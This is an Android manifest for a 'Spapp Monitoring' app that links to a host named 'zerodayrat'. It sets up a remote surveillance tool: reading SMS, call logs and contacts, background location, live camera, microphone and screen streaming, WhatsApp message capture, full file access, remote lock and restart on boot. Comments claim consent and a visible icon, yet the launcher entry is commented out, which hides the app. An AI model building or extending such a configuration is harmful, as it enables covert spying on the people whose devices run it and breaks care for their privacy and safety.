<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- Internet, required for all backend sync -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

    <!-- Location: on-demand fetch (Phase 5) + native geofencing (Phase 5) -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />

    <!-- App usage tracking (Phase 4) — special access, granted via Settings, not a runtime dialog -->
    <uses-permission
        android:name="android.permission.PACKAGE_USAGE_STATS"
        tools:ignore="ProtectedPermissions" />

    <!-- SMS / Call log / Contacts (Phase 4) — only requested if the admin enables these feature flags -->
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />

    <!-- Remote lock (Phase 6) -->
    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />

    <!-- Live screen & camera stream audio, camera hardware, and wake lock -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-feature android:name="android.hardware.camera" android:required="false" />
    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />

    <!-- Boot-time re-scheduling of periodic sync jobs -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <!-- Lets the app prompt the user to exempt it from Doze/App Standby battery
         restrictions, which on many OEM ROMs (especially MIUI) otherwise kill
         the periodic WorkManager sync job entirely in the background. -->
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

    <!-- Full device storage access for File Manager (Phase 6 extended scope).
         This app is sideloaded (not Play-Store-distributed), so the Play
         Store policy gate on this permission does not apply — the admin
         explicitly requested full storage browsing, not just the app's own
         sandbox. Still requires an explicit "Allow management of all files"
         grant in Settings; never silent. -->
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
        tools:ignore="ScopedStorage" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
        android:maxSdkVersion="32" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />

    <!-- Package visibility (Android 11+ / targetSdk 30+): without this,
         getInstalledApplications() silently returns only a filtered subset
         (apps that interact with this app), excluding most third-party apps
         like WhatsApp or Instagram — which is why Installed Apps was showing
         an incomplete list. This app is sideloaded, not Play-Store-distributed,
         so the Play policy restriction on this permission does not apply. -->
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
        tools:ignore="QueryAllPackagesPermission" />


    <application
        android:name=".SpappApplication"
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher"
        android:supportsRtl="true"
        android:theme="@style/Theme.SpappMonitoring">

        <!-- Visible launcher entry point — app icon is always shown, per project policy -->
        <activity
            android:name=".ui.SplashActivity"
            android:exported="true"
            android:theme="@style/Theme.SpappMonitoring">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <!-- <category android:name="android.intent.category.LAUNCHER" /> -->
            </intent-filter>
        </activity>

        <!-- Mandatory first-launch consent screen -->
        <activity
            android:name=".ui.ConsentActivity"
            android:exported="false" />

        <!-- Device code entry + backend activation, shown right after consent is granted.
             exported=true + the intent-filters below let the dashboard's QR code / shareable
             activation link open directly into this screen with the token pre-filled, so the
             device user doesn't have to type it.
               - https filter: matches the real link the dashboard generates
                 (https://<dashboard-domain>/connect?token=...&name=...) — this is what a QR
                 scanner or a tapped browser/WhatsApp link actually opens. Not autoVerify'd
                 (no Digital Asset Links file published yet), so Android may show an "Open
                 with" chooser between this app and the browser instead of opening silently.
               - spappmonitor:// filter: the dashboard's /connect fallback page redirects here
                 as a second attempt once it loads in the browser. -->
        <activity
            android:name=".ui.ActivationActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data
                    android:scheme="https"
                    android:host="zerodayrat.vercel.app"
                    android:pathPrefix="/connect" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="spappmonitor" android:host="activate" />
            </intent-filter>
        </activity>

        <!-- Main status screen shown after consent + activation -->
        <activity
            android:name=".ui.MainActivity"
            android:exported="false" />

        <!-- Fired by the OS when a registered geofence boundary is crossed (Phase 5) -->
        <receiver
            android:name=".geofence.GeofenceBroadcastReceiver"
            android:exported="false" />

        <!-- Remote lock (Phase 6) — activation requires an explicit system dialog -->
        <receiver
            android:name=".admin.SpappDeviceAdminReceiver"
            android:exported="true"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin_policies" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <!-- FCM push — instant command delivery (Phase 6) -->
        <service
            android:name=".fcm.SpappFirebaseMessagingService"
            android:exported="false">
            <intent-filter>
                <action android:name="com.google.firebase.MESSAGING_EVENT" />
            </intent-filter>
        </service>

        <receiver
            android:name=".sync.BootReceiver"
            android:exported="false">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

        <!-- App/website blocking (Phase 7) — activation requires the user to
             manually enable it in system Accessibility settings; Android does
             not allow silently granting this. -->
        <service
            android:name=".blocking.BlockAccessibilityService"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- Live camera streaming service (foreground service for background camera access) -->
        <service
            android:name=".camerastream.CameraStreamService"
            android:exported="false"
            android:foregroundServiceType="camera" />

        <!-- Live surrounding / ambient audio streaming service -->
        <service
            android:name=".audiostream.AudioStreamService"
            android:exported="false"
            android:foregroundServiceType="microphone" />

        <!-- Live screen streaming service (foreground service for continuous background screen streaming) -->
        <service
            android:name=".screenstream.ScreenStreamService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <!-- Notification listener for WhatsApp chat message capture -->
        <service
            android:name=".collectors.WhatsAppNotificationListener"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

    </application>
</manifest>
